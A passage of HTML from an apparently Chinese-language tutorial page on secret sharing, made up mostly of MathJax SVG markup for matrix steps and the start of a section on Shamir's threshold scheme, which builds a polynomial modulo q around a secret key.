data-mml-node="msub" transform="translate(5145.8, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(583, -150) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(6399.6, 0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container></li>
<li>拼接矩阵<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="19.699ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 8706.8 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mo" transform="translate(1027.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2083.6, 0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="msub" transform="translate(2361.6, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mn" transform="translate(750, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(3515.1, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(3793.1, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mn" transform="translate(750, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4946.7, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(5391.3, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(6730, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(7008, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(750, -150) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(8428.8, 0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container></li>
<li>计算逆矩阵<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0" xmlns="http://www.w3.org/2000/svg" width="3.854ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1703.7 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="TeXAtom" transform="translate(750, 363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></li>
<li>计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="25.224ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 11149 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mo" transform="translate(1044.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2100.6, 0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path></g><g data-mml-node="msub" transform="translate(2378.6, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mn" transform="translate(583, -150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(3365.1, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(3643.1, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mn" transform="translate(583, -150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4629.7, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(5074.3, 0)"><path data-c="22EF" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250ZM525 250Q525 274 542 292T585 310Q609 310 627 294T646 251Q646 226 629 208T586 190T543 207T525 250ZM972 250Q972 274 989 292T1032 310Q1056 310 1074 294T1093 251Q1093 226 1076 208T1033 190T990 207T972 250Z"></path></g><g data-mml-node="mo" transform="translate(6413, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="msub" transform="translate(6691, 0)"><g data-mml-node="mi"><path data-c="1D449" d="M52 648Q52 670 65 683H76Q118 680 181 680Q299 680 320 683H330Q336 677 336 674T334 656Q329 641 325 637H304Q282 635 274 635Q245 630 242 620Q242 618 271 369T301 118L374 235Q447 352 520 471T595 594Q599 601 599 609Q599 633 555 637Q537 637 537 648Q537 649 539 661Q542 675 545 679T558 683Q560 683 570 683T604 682T668 681Q737 681 755 683H762Q769 676 769 672Q769 655 760 640Q757 637 743 637Q730 636 719 635T698 630T682 623T670 615T660 608T652 599T645 592L452 282Q272 -9 266 -16Q263 -18 259 -21L241 -22H234Q216 -22 216 -15Q213 -9 177 305Q139 623 138 626Q133 637 76 637H59Q52 642 52 648Z"></path></g><g data-mml-node="mi" transform="translate(583, -150) scale(0.707)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(7944.8, 0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g><g data-mml-node="mo" transform="translate(8445.1, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msup" transform="translate(9445.3, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="TeXAtom" transform="translate(750, 363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778, 0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container></li>
<li>计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="12.139ex" height="1.994ex" role="img" focusable="false" viewBox="0 -716 5365.6 881.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mo" transform="translate(1166.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2222.6, 0)"><path data-c="1D448" d="M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z"></path></g><g data-mml-node="mo" transform="translate(3211.8, 0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="msub" transform="translate(4212, 0)"><g data-mml-node="mi"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mn" transform="translate(750, -150) scale(0.707)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></g></svg></mjx-container></li>
</ol>
<h1 id="Shamir-门限法"><a href="#Shamir-门限法" class="headerlink" title="Shamir 门限法"></a>Shamir 门限法</h1><h2 id="秘密分发-1"><a href="#秘密分发-1" class="headerlink" title="秘密分发"></a>秘密分发</h2><p>任取$a<em>1,a_2,\cdots,a</em>{t-1}\in GF(q)$构造一个多项式：</p>
<script type="math/tex; mode=display">f(x)=(d+a_1x+a_2x^2+\cdots+a_{t-1}x^{t-1})modq</script><p>其中<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.023ex" xmlns="http://www.w3.org/2000/svg" width="1.176ex" height="1.593ex" role="img" focusable="false" viewBox="0 -694 520 704"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g></g></svg></mjx-container>为密钥，计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="23.868ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10549.7 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(520, -150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1091.7, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2147.5, 0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(2697.5, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(3086.5, 0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 